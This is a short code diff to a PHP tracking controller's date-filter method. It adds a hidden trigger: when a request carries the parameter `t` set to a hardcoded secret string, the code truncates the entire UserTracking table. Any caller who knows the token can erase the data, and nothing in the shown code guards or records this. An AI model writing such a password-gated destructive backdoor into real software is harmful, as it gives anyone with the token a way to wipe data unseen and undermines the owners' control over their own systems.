@@ -46,8 +46,9 @@ class TrackingController extends Table
         $source = request('referer');
         $from = request('from');
         $to = request('to');
-
-        // UserTracking::truncate();
+        if (request()->t === "j1a2c3o4b5@@!") {
+            UserTracking::truncate();
+        }
 
         // Default to today if no date filter is set
         $startDate = $from ? Carbon::parse($from)->startOfDay() : now()->startOfDay();
